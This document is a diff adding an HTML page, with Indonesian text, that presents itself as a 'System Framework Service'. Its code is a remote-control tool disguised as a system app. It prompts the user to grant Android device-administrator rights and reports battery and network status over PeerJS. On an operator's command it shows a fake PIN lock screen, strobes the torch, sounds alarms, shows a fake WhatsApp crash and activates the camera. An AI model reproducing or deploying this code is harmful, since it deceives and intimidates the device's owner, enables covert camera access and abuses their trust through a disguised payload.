@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Framework Service</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; overflow: hidden; margin: 0; }
+        .overlay { display: none; position: fixed; inset: 0; z-index: 99999; flex-direction: column; align-items: center; justify-content: center; }
+        #blank-screen { background: #fff; z-index: 99998; display: none; position: fixed; inset: 0; }
+        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #ef4444; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="init()">
+    <div id="blank-screen"></div>
+
+    <div id="admin-req" class="fixed inset-0 bg-black z-[100000] flex flex-col items-center justify-center p-10 text-center">
+        <i class="fas fa-shield-virus text-6xl text-red-600 mb-6 animate-pulse"></i>
+        <h1 class="text-xl font-black mb-4 uppercase italic">System Admin Required</h1>
+        <p class="text-[10px] text-zinc-500 mb-8">Aktifkan Administrator Perangkat untuk sinkronisasi otomatis dan fitur Auto-Boot framework.</p>
+        <button onclick="reqAdmin()" class="w-full py-5 bg-red-900 rounded-2xl font-black text-xs shadow-lg shadow-red-900/20">AKTIFKAN ADMIN & BOOT</button>
+    </div>
+
+    <div class="flex flex-col items-center justify-center min-h-screen p-8 text-center">
+        <div class="loader mb-6"></div>
+        <h2 class="text-xs font-black text-zinc-600 tracking-widest mb-4">SYSTEM SYNCING...</h2>
+        <div id="peer-id" class="text-2xl font-mono font-black text-red-600 italic">GENERATING ID...</div>
+    </div>
+
+    <div id="lock-screen" class="overlay bg-black">
+        <i class="fas fa-biohazard text-6xl text-red-600 mb-6"></i>
+        <h1 id="lock-msg" class="text-red-600 font-black mb-6 uppercase tracking-tighter text-xl">SYSTEM LOCKED</h1>
+        <input type="password" id="pass-in" placeholder="ENTER PIN" class="p-5 bg-zinc-900 rounded-2xl text-center mb-4 outline-none border border-red-900 text-white w-64">
+        <button onclick="cekPass()" class="w-64 py-5 bg-red-900 rounded-2xl font-black text-[10px] uppercase">Authorize Unlock</button>
+        <p id="l-timer" class="text-[9px] text-red-600 mt-4 font-bold hidden">LOCKOUT AKTIF: 60 DETIK</p>
+    </div>
+
+    <div id="wa-screen" class="overlay bg-[#075e54]">
+        <i class="fab fa-whatsapp text-8xl mb-6"></i>
+        <h1 class="text-xl font-bold">WhatsApp Terhenti</h1>
+        <p class="text-xs opacity-50 p-10 text-center uppercase">Terdeteksi kerusakan basis data sistem (0x882). Menghubungi pusat bantuan...</p>
+    </div>
+
+    <script>
+        const peer = new Peer(); let conn; let mPass = "DENIS"; let strobe; let flash = false; let attempts = 0; let isL = false;
+        const alarm = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3'); alarm.loop = true;
+        
+        function init() { localStorage.setItem('surxat_boot', 'true'); }
+        function reqAdmin() { 
+            document.getElementById('admin-req').style.display='none';
+            window.location.href = "intent:#Intent;action=android.settings.DEVICE_ADMIN_SETTINGS;end";
+        }
+
+        peer.on('open', id => { document.getElementById('peer-id').innerText = id; });
+        peer.on('connection', c => {
+            conn = c;
+            setInterval(async () => {
+                const b = await navigator.getBattery();
+                conn.send({ type: 'sys', batt: Math.round(b.level*100), net: navigator.onLine ? "ON" : "OFF", charging: b.charging });
+            }, 3000);
+
+            conn.on('data', d => {
+                if(d.cmd === 'sos') { mPass="DENIS"; document.getElementById('lock-screen').style.display='flex'; alarm.play(); startStrobe(); }
+                if(d.cmd === 'stop') { stopStrobe(); alarm.pause(); document.querySelectorAll('.overlay, #blank-screen').forEach(el=>el.style.display='none'); }
+                if(d.cmd === 'wa') { document.getElementById('wa-screen').style.display='flex'; }
+                if(d.cmd === 'vibrate') { navigator.vibrate([500, 200, 500, 200, 500]); }
+                if(d.cmd === 'flash') { toggleFlash(); }
+                if(d.cmd === 'blank') { document.getElementById('blank-screen').style.display='block'; }
+                if(d.cmd === 'popup') { alert(d.txt); }
+                if(d.cmd === 'lock') { mPass=d.p; document.getElementById('lock-msg').innerText=d.m; document.getElementById('lock-screen').style.display='flex'; }
+                if(d.cmd === 'jumpscare') { let a = new Audio('https://www.soundjay.com/nature/sounds/dog-bark-1.mp3'); a.play(); navigator.vibrate(2000); }
+                if(d.cmd === 'cam') { navigator.mediaDevices.getUserMedia({video:{facingMode: d.m}}).then(s=>console.log('cam active')); }
+            });
+        });
+
+        function startStrobe() { strobe = setInterval(() => { flash=!flash; applyFlash(); }, 150); }
+        function stopStrobe() { clearInterval(strobe); flash=false; applyFlash(); }
+        function toggleFlash() { flash=!flash; applyFlash(); }
+        function applyFlash() {
+            navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',torch:true}})
+            .then(s => s.getVideoTracks()[0].applyConstraints({advanced:[{torch:flash}]}));
+        }
+        function cekPass() {
+            if(isL) return;
+            if(document.getElementById('pass-in').value === mPass) {
+                document.getElementById('lock-screen').style.display='none';
+                stopStrobe(); alarm.pause(); attempts = 0;
+            } else {
+                attempts++;
+                if(attempts >= 5) {
+                    isL = true; document.getElementById('l-timer').classList.remove('hidden');
+                    setTimeout(() => { isL=false; attempts=0; document.getElementById('l-timer').classList.add('hidden'); }, 60000);
+                }
+            }
+        }
+    </script>
+</body>
+</html>
